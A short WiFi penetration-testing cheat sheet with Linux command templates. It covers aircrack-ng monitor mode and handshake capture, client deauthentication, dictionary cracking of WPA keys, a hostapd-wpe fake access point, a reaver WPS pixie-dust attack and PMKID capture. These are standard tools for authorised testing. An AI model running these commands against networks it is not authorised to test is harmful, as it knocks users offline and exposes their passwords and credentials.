# wifi

#plateform/linux #target/remote #cat/RECON #cat/ATTACK

## airmon - Kill processes which can cause trouble
```
airmon-ng check kill
```

## airmon - start interface
```
airmon-ng start <wlan_interface>
```

## airmon - stop interface
```
airmon-ng stop <wlanmon_interface>
```

## NetworkManager - Restart NetworkManager
```
systemctl restart NetworkManager
```

## airodump - listen to everything
```
airodump-ng <wlanmon_interface>
```

## airodump - listen to specific SSID
```
airodump-ng --bssid <mac_address> -c <channel> -w <output_file> <wlanmon_interface>
```

## aireplay - deauth client
```
aireplay-ng --deauth <deauth_count> -c <client_mac_address> -a <mac_address> <wlanmon_interface>
```

## aircrack - crack handshake for PSK
```
aircrack-ng -w <dictionary> <input_file>
```

## hostapd-wpe - launch fake AP
```
hostapd-wpe <hostapd_conf>
```

## kismet - monitor WiFi
```
kismet -c <wlan_interface>
```

## nmcli - set back WiFi interface to managed mode
```
nmcli device set <wlan_interface> managed true
```

## reaver - launch WPS pixiedust attack
```
reaver -i <wlanmon_interface> -b <mac_address> -c <channel> -Z
```

## hcxdumptool - WPA2-PSK PMKID Capture
```
hcxdumptool -i <wlanmon_interface> -o capture.pcapng --enable_status=1 -c <channel>
```

## hcxdumptool - 
```
hcxpcaptool -z test.16800 test.pcapng
```

= wlan_interface: wlan0
= wlanmon_interface: wlan0mon
= deauth_count: 5
= hostapd_conf: /etc/hostapd-wpe/hostapd-wpe.conf
